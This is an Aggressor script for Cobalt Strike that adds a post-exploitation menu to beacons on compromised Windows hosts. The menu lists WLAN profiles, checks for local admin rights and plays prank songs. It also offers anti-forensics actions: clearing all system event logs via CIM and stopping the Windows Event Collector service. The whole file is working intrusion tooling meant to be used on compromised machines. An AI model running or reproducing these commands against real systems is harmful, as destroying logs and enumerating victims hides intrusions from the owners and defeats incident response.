# Adds menu driven support for some post exploit stuff

popup beacon_bottom{
	menu "Post-Exploitation" {
		menu "Enumeration" {
			item "List WLAN Profiles"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "netsh wlan show profiles");
					bshell($1, "netsh wlan show profiles");
				}
			}
			item "Is User Local Admin?"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell Is-UserLocalAdmin")
					bpowershell($1, "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")")
				}
			}
		}
		menu "Anti-forensics" {
			item "Clear System Event Logs (psh)"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
					bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
				}
			}
			item "Stop Windows Event Collector svc"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "sc stop wecsvc");
					bshell($1, "sc stop wecsvc");
				}
			}
		}
		menu "Annoy" {
			# Credit goes to SadProcessor for these scripts!
			menu "Play chiptunes" {
				item "Play Imperial March" {
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import Play-ImperialMarch.ps1");
						bpowershell_import($1, script_resource("scripts/annoySongs/Play-ImperialMarch.ps1"));
						binput($1, "powershell Play-ImperialMarch");
						bpowershell($1, "Play-ImperialMarch");
					}
				}
				item "Play Rickroll" {
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import Play-RickAstley.ps1");
						bpowershell_import($1, script_resource("scripts/annoySongs/Play-RickAstley.ps1"));
						binput($1, "powershell Play-RickAstely");
						bpowershell($1, "Play-RickAstely");
					}
				}
				item "Play Tetris Theme" {
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import Play-TetrisTune.ps1");
						bpowershell_import($1, script_resource("scripts/annoySongs/Play-TetrisTune.ps1"));
						binput($1, "powershell Play-TetrisTune");
						bpowershell($1, "Play-TetrisTune");
					}
				}
			}
		}
	}
}